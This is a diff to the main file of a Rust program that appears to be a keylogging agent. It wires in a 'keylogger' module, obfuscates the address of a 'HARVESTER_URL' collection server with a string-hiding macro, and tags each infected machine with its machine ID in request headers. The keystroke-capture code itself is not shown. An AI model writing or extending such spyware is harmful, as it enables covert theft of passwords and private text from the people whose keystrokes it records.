@@ -13,20 +13,24 @@ use reqwest::{
 mod uptime_pinger;
 pub use uptime_pinger::uptime_pinger;
 
-static HARVESTER_URL: Lazy<&'static str> = Lazy::new(|| muddy!("http://localhost:6767"));
-static MACHIDE_ID: Lazy<String> =
+mod keylogger;
+pub use keylogger::keylogger;
+
+static HARVESTER_URL: Lazy<&'static str> = Lazy::new(|| muddy!("localhost:6767"));
+static MACHINE_ID: Lazy<String> =
     Lazy::new(|| machine_uid::machine_id::get_machine_id().unwrap_or("unknown".into()));
 
 #[tokio::main]
 async fn main() {
     env_logger::Builder::from_env(Env::default().default_filter_or("debug")).init();
+    info!("outlet inited with machine id: {:?}", MACHINE_ID);
 
     let mut headers = HeaderMap::new();
-    headers.insert("machine-id", HeaderValue::from_str(&MACHIDE_ID).unwrap());
+    headers.insert("machine-id", HeaderValue::from_str(&MACHINE_ID).unwrap());
     let reqwest_client = Client::builder().default_headers(headers).build().unwrap();
 
-    let rx = spawn_keylogger();
-    uptime_pinger(reqwest_client.to_owned());
+    uptime_pinger();
+    keylogger(reqwest_client.to_owned());
 
     info!("successfully inited, running forever!");
     pending::<()>().await;
